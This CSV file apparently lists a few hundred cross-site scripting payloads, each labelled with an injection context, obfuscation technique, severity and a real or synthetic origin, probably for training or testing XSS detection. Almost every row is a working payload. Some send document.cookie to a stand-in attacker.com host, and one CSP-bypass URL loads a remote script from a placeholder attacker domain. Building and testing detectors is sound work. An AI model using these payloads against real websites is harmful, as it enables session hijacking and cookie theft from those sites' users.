payload,context,technique,severity,length,source
\%22 ondblclick=confirm(1)//,attribute_escape,synthetic,medium,28,synthetic
j&#97;v&#97;script:&#97;l&#101;rt(1),js_uri,synthetic,low,36,synthetic
&quot; ontouchst&#97;rt=prompt(docum&#101;nt.dom&#97;in) x=&quot;,attribute_escape,synthetic,medium,65,synthetic
"<base
onpointerup=\u0061lert(location.hash)>",tag_injection,synthetic,low,44,synthetic
<tr onfocus=confirm(%27XSS%27)>,tag_injection,synthetic,medium,31,synthetic
"<figcaption onmousemove=""alert(1)"">AnonKryptiQuz</figcaption>",tag_injection,none,medium,61,real
<!--><audio onpause=console.log(document.domain)>,tag_injection,synthetic,medium,49,synthetic
"\"" oncut=confirm('XSS')//",attribute_escape,synthetic,medium,25,synthetic
"<i onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</i>",tag_injection,none,medium,78,real
"%3Cmarquee x=y onbeforetoggle=alert(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,69,synthetic
"<nextid oncontextmenu=""alert(1)"">AnonKryptiQuz</nextid>",tag_injection,none,medium,55,real
"<cite oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,97,real
&#106;avascr	ipt:prompt('XSS'),js_uri,synthetic,medium,30,synthetic
{{cOnfIrm 1}},template_injection,synthetic,low,13,synthetic
"""><EmbEd OnmOzfUllScrEenChaNge=coNfiRm(LocAtiOn.HasH)>",tag_injection,synthetic,medium,54,synthetic
`><img src=x oncopy=confirm(%27XSS%27)>,attribute_escape,synthetic,medium,39,synthetic
%3C!--%3E%3Cimg onreset=console.log(document.domain)%3E,tag_injection,synthetic,medium,55,synthetic
<link onpointerdown=alert(1) style=display:block>AnonKryptiQuz</link>,tag_injection,none,medium,69,real
"""><animate onfocus=console.log(document.domain)>",tag_injection,synthetic,medium,48,synthetic
"eval(""alert(1)"")",dom_sink,synthetic,medium,16,synthetic
"setTimeout(%22console.log(%27//attacker.com/?c=%27+document.cookie)%22,0)",dom_sink,synthetic,high,73,synthetic
`%3E%3Cimg src=x onsearch=prompt(document.domain)%3E,attribute_escape,synthetic,medium,52,synthetic
"__pRotO__[""oNenD""]=XMLHtTpREquEst(doCumEnt.coOkiE+'&loC='+loCatIon.hrEf)",dom_sink,synthetic,high,72,synthetic
"""`'><script>\xE2\x80\x87javascript:alert(7616)</script>",script_injection,none,medium,55,real
<small onblur=alert(1) tabindex=1 id=x></small><input autofocus>,tag_injection,none,medium,64,real
"""><img src=x onselect=prompt(1)>",attribute_escape,synthetic,medium,32,synthetic
OnmOusEenTer=alErt('XSS'),event_handler,synthetic,medium,25,synthetic
<object onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</object><input value=clickme>,tag_injection,none,medium,103,real
"perl -e &#039;print \"";<;SCR\0IPT>;alert(\"";XSS\"";)<;/SCR\0IPT>;\"";;&#039; >; out",generic,html_entity,medium,81,real
"<IMG SRC=x ondragenter=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,62,real
<dt id=x tabindex=1 onfocusin=alert(1)></dt>,tag_injection,none,medium,44,real
' onhashchange=alert('XSS') ',attribute_escape,synthetic,medium,29,synthetic
\' onkeydown=alert(location.hash)//,attribute_escape,synthetic,medium,35,synthetic
"<input4 draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</input4>",tag_injection,none,medium,88,real
"Obj&#101;ct.&#97;ssign(window,{""onpl&#97;y"":f&#101;tch})",dom_sink,synthetic,low,56,synthetic
"<meter onmouseup=""alert(1)"">AnonKryptiQuz</meter>",tag_injection,none,medium,49,real
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=prompt('//attacker.com/?c='+document.cookie)%3E"")",dom_sink,synthetic,high,110,synthetic
"""%3E%3Cobject onbeforepaste=confirm(document.domain)%3E",tag_injection,synthetic,medium,55,synthetic
"""<script>alert(0)</script>""@gmail.com",script_injection,none,medium,37,real
onb&#101;for&#101;copy=consol&#101;.log('XSS'),event_handler,synthetic,low,46,synthetic
"<style>@keyframes x{}</style><ruby style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></ruby>",tag_injection,none,medium,101,real
 onplaying=alert(1),event_handler,synthetic,medium,19,synthetic
<blockquote onpointerleave=alert(1) style=display:block>AnonKryptiQuz</blockquote>,tag_injection,none,medium,82,real
OnbEfoRemAtcH=pRomPt/*x*/('XSS'),event_handler,synthetic,low,32,synthetic
"window[""alert""](document.cookie)",dom_sink,synthetic,high,32,synthetic
JavAscRipT:aLerT/*X*/('XSS'),js_uri,synthetic,low,28,synthetic
' ><svg onb&#101;for&#101;m&#97;tch=&#97;l&#101;rt('XSS')>,attribute_escape,synthetic,low,58,synthetic
"&#106;AvaScrIpt:alErt(StRinG.fRomChaRCoDe(88,83,83))",js_uri,synthetic,high,52,synthetic
<emBed x=Y oNmoZfuLlsCreEncHanGe=ConFirM(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,56,synthetic
%22><img src=x onpageswap=alert(document.domain)>,attribute_escape,synthetic,medium,49,synthetic
%3Ctd	onstalled=confirm('XSS')%3E,tag_injection,synthetic,medium,33,synthetic
' %3E%3Csvg oncopy=console.log('XSS')%3E,attribute_escape,synthetic,medium,40,synthetic
{{#WitH aLerT(dOcuMenT.dOmaIn)}}...{{/wIth}},template_injection,synthetic,medium,44,synthetic
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=aLerT(dOcuMenT.cOokIe)>""",dom_sink,synthetic,high,68,synthetic
"	onAuxCliCk=ConFirM(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,50,synthetic
"<xmp	onmousewheel=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,56,synthetic
"&fileName=')},1000);alert(""AnonKryptiQuz`);//",generic,none,medium,45,real
"<body onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</body>",tag_injection,none,medium,67,real
"onload=prompt/**/(String.fromCharCode(88,83,83))",event_handler,synthetic,high,48,synthetic
<wbr onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</wbr><input value=clickme>,tag_injection,none,medium,97,real
'><Img srC=x onInpUt=ConFirM(1)>,attribute_escape,synthetic,medium,32,synthetic
"setTimeout(""console.log(1)"",0)",dom_sink,synthetic,medium,30,synthetic
"<div draggable=""true"" contenteditable>drag me</div><abbr ondragover=alert(1) contenteditable style=display:block>drop here</abbr>",tag_injection,none,medium,129,real
"' oNanImaTioNitEraTioN=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape,synthetic,high,67,synthetic
%22><meta onsecuritypolicyviolation=prompt(%27XSS%27)>,tag_injection,synthetic,medium,54,synthetic
<header onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
<body onactivate=alert(1)>,tag_injection,none,medium,26,real
<sp&#97;n	ons&#101;curitypolicyviol&#97;tion=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,83,synthetic
"<menu onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</menu>",tag_injection,none,medium,69,real
"<hgroup draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</hgroup>",tag_injection,none,medium,70,real
&quOt; onHasHchAngE=cOnfIrm(doCumEnt.doMaiN) X=&QuoT;,attribute_escape,synthetic,medium,53,synthetic
"<style>@keyframes slidein {}</style><tfoot style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></tfoot>",tag_injection,none,medium,170,real
"""><Img srC=x onPauSe=ConSolE.lOg(DocUmeNt.DomAin)>",attribute_escape,synthetic,medium,50,synthetic
ontransitionrun=confirm(1),event_handler,synthetic,medium,26,synthetic
'><img src=x ongotpoint&#101;rc&#97;ptur&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,low,90,synthetic
"""><Img srC=x onPagEreVeaL=cOnfIrm(doCumEnt.doMaiN)>",attribute_escape,synthetic,medium,51,synthetic
"%3Cscript%3Econfirm`String.fromCharCode(88,83,83)`%3C/script%3E",script_injection,synthetic,high,63,synthetic
oninput=javascr	ipt:alert(1),event_handler,synthetic,medium,28,synthetic
<td/onStaLleD=cOnfIrm('XSS')>,tag_injection,synthetic,medium,29,synthetic
%22 ontouchmove=console.log(%27XSS%27) %22,attribute_escape,synthetic,medium,42,synthetic
' oncut=confirm('XSS') ',attribute_escape,synthetic,medium,24,synthetic
onpoint&#101;rup=prompt(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,49,synthetic
<!--><template onended=prompt('XSS')>,tag_injection,synthetic,medium,37,synthetic
"%3Cxmp
ontransitionend=alert(location.hash)%3E",tag_injection,synthetic,medium,46,synthetic
%27 ><svg onpageshow=console.log(location.hash)>,attribute_escape,synthetic,medium,48,synthetic
"<base
onpageswap=alert(%27XSS%27)>",tag_injection,synthetic,medium,34,synthetic
"<baSe OntOucHmoVe=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83)) onTouChmOve=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,high,116,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onpoint&#101;rr&#97;wupd&#97;t&#101;"":confirm})",dom_sink,synthetic,low,79,synthetic
"<canvas draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</canvas>",tag_injection,none,medium,70,real
<select autofocus onfocusin=alert(1)>,tag_injection,none,medium,37,real
"<embed oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,98,real
<style>@keyframes a{}b{animation:a;}</style> <b/onanimationstart=prompt`${document.domain}&#x60;>,template_injection,html_entity,low,97,real
<!<script>alert(4)</script>,script_injection,none,medium,27,real
<script>alert`'XSS'`</script>,script_injection,synthetic,low,29,synthetic
on&#97;nim&#97;tionit&#101;r&#97;tion=j&#97;v&#97;script:confirm('XSS'),event_handler,synthetic,medium,71,synthetic
<imG oNpaGesWap=coNsoLe.Log(1) onPagEswAp=ConSolE.lOg(1)>,tag_injection,synthetic,medium,57,synthetic
\%22 onpromptdismiss=alert(document.domain)//,attribute_escape,synthetic,medium,45,synthetic
onanimationend=console.log(%27XSS%27),event_handler,synthetic,medium,37,synthetic
"<scRipT>wIndOw['alErt'](StrIng.frOmCHarCodE(88,83,83))</sCriPt>",script_injection,synthetic,high,63,synthetic
	onscrollend=\u0061lert('XSS'),event_handler,synthetic,low,30,synthetic
<samp onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</samp><input value=clickme>,tag_injection,none,medium,99,real
"<noscript><p title=""</noscript><img src=x onerror=([,O,B,J,E,C,,]=[]+{},[T,R,U,E,F,A,L,S,,,N]=[!!O]+!O+B.E)[X=C+O+N+S+T+R+U+C+T+O+R][X](A+L+E+R+T+(document.cookie))()>"">",dom_sink,none,high,169,real
""" ><svG oNmoUseUp=ConSolE.lOg('XSS')>",attribute_escape,synthetic,medium,37,synthetic
%3Ciframe/oninput=console.log(location.hash)%3E,tag_injection,synthetic,medium,47,synthetic
 onmousedown=confirm(1),event_handler,synthetic,medium,23,synthetic
"	onInpUt=ProMpt(StRinG.fRomChaRCoDe(88,83,83))",event_handler,synthetic,high,46,synthetic
<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>,tag_injection,none,medium,81,real
`><img src=x ongotpoint&#101;rc&#97;ptur&#101;=&#97;l&#101;rt(1)>,attribute_escape,synthetic,low,65,synthetic
"<form draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</form>",tag_injection,none,medium,84,real
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:&#97;l&#101;rt('XSS')""",dom_sink,synthetic,low,65,synthetic
"<rtc onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</rtc>",tag_injection,none,medium,68,real
	onh&#97;shch&#97;ng&#101;=&#97;l&#101;rt('XSS'),event_handler,synthetic,low,48,synthetic
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()>",generic,case_variation,medium,48,real
""" oNanImaTioNitEraTioN=aLerT(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape,synthetic,high,61,synthetic
"<footer onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</footer>",tag_injection,none,medium,87,real
onmous&#101;&#101;nt&#101;r=j&#97;v&#97;script:&#97;l&#101;rt('XSS'),event_handler,synthetic,low,68,synthetic
""" onp&#97;g&#101;r&#101;v&#101;&#97;l=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,low,77,synthetic
' oNfoCusOut=coNsoLe.Log(loCatIon.haSh) ',attribute_escape,synthetic,medium,41,synthetic
<select id=x tabindex=1 onbeforeactivate=alert(1)></select>,tag_injection,none,medium,59,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hgroup id=x style=""position:absolute;"" onanimationcancel=""print()""></hgroup>",tag_injection,none,low,181,real
"%22><img src=x onclose=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,61,synthetic
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:f&#101;tch('XSS')""",dom_sink,synthetic,low,61,synthetic
"""><Img srC=x onGesTurEenD=cOnfIrm('XSS')>",attribute_escape,synthetic,medium,41,synthetic
	onload=prompt(document.domain),event_handler,synthetic,medium,31,synthetic
"__proto__[""onpointerdown""]=alert(document.domain)",dom_sink,synthetic,medium,49,synthetic
""" ><svg onvolum&#101;ch&#97;ng&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,92,synthetic
"<big onclick=""alert(1)"">AnonKryptiQuz</big>",tag_injection,none,medium,43,real
`><img src=x ontoggle=\u0061lert(document.domain)>,attribute_escape,synthetic,low,50,synthetic
%27><img src=x onmouseup=prompt(document.domain)>,attribute_escape,synthetic,medium,49,synthetic
"\"" OnmOusEenTer=alErt(loCatIon.haSh)//",attribute_escape,synthetic,medium,38,synthetic
&quot; onb&#101;gin=consol&#101;.log(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape,synthetic,low,68,synthetic
"onstalled=console.log(String.fromCharCode(88,83,83))",event_handler,synthetic,high,52,synthetic
"location.href=""javascript:XMLHttpRequest('XSS')""",dom_sink,synthetic,high,48,synthetic
"""><img src=x onpromptdismiss=alert('XSS')>",attribute_escape,synthetic,medium,42,synthetic
<section contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,61,real
 ondragover=prompt(document.domain),event_handler,synthetic,medium,35,synthetic
' ><svG oNinValId=ProMpt(1)>,attribute_escape,synthetic,medium,28,synthetic
' ><svG oNweBkiTanImaTioNenD=cOnfIrm('XSS')>,attribute_escape,synthetic,medium,44,synthetic
"document.querySelector(%22body%22).innerHTML+=%22console.log(String.fromCharCode(88,83,83))%22",dom_sink,synthetic,high,94,synthetic
"""%3E%3Cimg src=x onscrollsnapchange=confirm('XSS')%3E",attribute_escape,synthetic,medium,53,synthetic
&quot; onend=console.log('XSS') x=&quot;,attribute_escape,synthetic,medium,40,synthetic
%27 onanimationend=confirm(location.hash) %27,attribute_escape,synthetic,medium,45,synthetic
"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",tag_injection,none,low,58,real
"<area oncut=""alert(1)"" contenteditable>AnonKryptiQuz</area>",tag_injection,none,medium,59,real
onhashchange=javascript:alert(location.hash),event_handler,synthetic,medium,44,synthetic
"<noframes ondblclick=""alert(1)"">AnonKryptiQuz</noframes>",tag_injection,none,medium,56,real
OnfOcuSin=coNfiRm/***/('XSS'),event_handler,synthetic,low,29,synthetic
onpointermove=confirm/***/('XSS'),event_handler,synthetic,low,33,synthetic
""" ><svg ons&#101;l&#101;ct=confirm(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,medium,58,synthetic
"<hr onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</hr>",tag_injection,none,medium,66,real
<svg onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</svg><input value=clickme>,tag_injection,none,medium,97,real
<big onpointerdown=alert(1) style=display:block>AnonKryptiQuz</big>,tag_injection,none,medium,67,real
"\"" onwh&#101;&#101;l=prompt('XSS')//",attribute_escape,synthetic,medium,36,synthetic
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>,generic,html_entity,low,56,real
' ontouchmove=prompt('XSS') ',attribute_escape,synthetic,medium,29,synthetic
"onkeydown=\u0061lert/**/(String.fromCharCode(88,83,83))",event_handler,synthetic,high,55,synthetic
%22 ><svg onvolumechange=alert(%27XSS%27)>,attribute_escape,synthetic,medium,42,synthetic
<td onst&#97;ll&#101;d=confirm('XSS') onst&#97;ll&#101;d=confirm('XSS')>,tag_injection,synthetic,medium,72,synthetic
"<animatemotion draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</animatemotion>",tag_injection,none,medium,104,real
%3Ctemplate x=y onended=prompt('XSS')%3E,tag_injection,synthetic,medium,40,synthetic
"setTimeout(%22console.log(location.hash)%22,0)",dom_sink,synthetic,medium,46,synthetic
""" oncut=alert('XSS') """,attribute_escape,synthetic,medium,22,synthetic
"<acronym oncut=""alert(1)"" contenteditable>AnonKryptiQuz</acronym>",tag_injection,none,medium,65,real
 oncanplay=console.log(%27XSS%27),event_handler,synthetic,medium,33,synthetic
%27 ><svg onfullscreenchange=alert(location.hash)>,attribute_escape,synthetic,medium,50,synthetic
<img onerror=a&#x006c;ert(1) src=a>,tag_injection,html_entity,low,35,real
"<maRquEe OnpRomPtdIsmIss=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))/>",tag_injection,synthetic,high,69,synthetic
%22><set onclose=confirm(document.domain)>,tag_injection,synthetic,medium,42,synthetic
<button popovertarget=x>Click me</button><iframe ontoggle=alert(1) popover id=x>AnonKryptiQuz</iframe>,tag_injection,none,medium,102,real
<teXtaRea onScrOllEnd=alErt('XSS') oNscRolLenD=aLerT('XSS')>,tag_injection,synthetic,medium,60,synthetic
&quot; onpointerdown=alert(document.domain) x=&quot;,attribute_escape,synthetic,medium,52,synthetic
OnpOinTerCanCel=jaVasCriPt:ConSolE.lOg(1),event_handler,synthetic,medium,41,synthetic
"http://example.lab/csp.php?xss=f=document.createElement%28""iframe""%29;f.id=""pwn"";f.src=""/robots.txt"";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//[ATTACKER.DOMAIN.TLD]/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;",dom_sink,url_encoding,high,294,real
"loc&#97;tion=""j&#97;v&#97;script:confirm(loc&#97;tion.h&#97;sh)""",dom_sink,synthetic,medium,64,synthetic
"<style>:target {color:red;}</style><shadow id=x style=""transition:color 1s"" ontransitionstart=alert(1)></shadow>",tag_injection,none,medium,112,real
"setInterval(%22confirm(document.domain)%22,100)",dom_sink,synthetic,high,47,synthetic
<foRm OnpAgeRevEal=coNsoLe.Log(loCatIon.haSh)/>,tag_injection,synthetic,medium,47,synthetic
"<xss/onanimationstart=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,61,synthetic
&lt;A HREF=&quot;h&#x0A;tt&#09;p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;,generic,html_entity|whitespace_obfuscation,low,85,real
""" ><svg ontr&#97;nsitionrun=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,83,synthetic
"__proto__[""onmozfullscreenchange""]=eval(navigator.sendBeacon('//attacker.com',document.cookie))",dom_sink,synthetic,high,95,synthetic
"<template
onbegin=alert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,55,synthetic
%27 onauxclick=alert(1) %27,attribute_escape,synthetic,medium,27,synthetic
<img2 onpointerup=alert(1) style=display:block>AnonKryptiQuz</img2>,tag_injection,none,medium,67,real
"%3CSCRIPT%3Eprompt(String.fromCharCode(88,83,83))%3C/SCRIPT%3E",script_injection,synthetic,high,62,synthetic
"LocAtiOn=""jaVasCriPt:XMLHttPReQueSt(BtoA(dOcuMenT.cOokIe))""",dom_sink,synthetic,high,59,synthetic
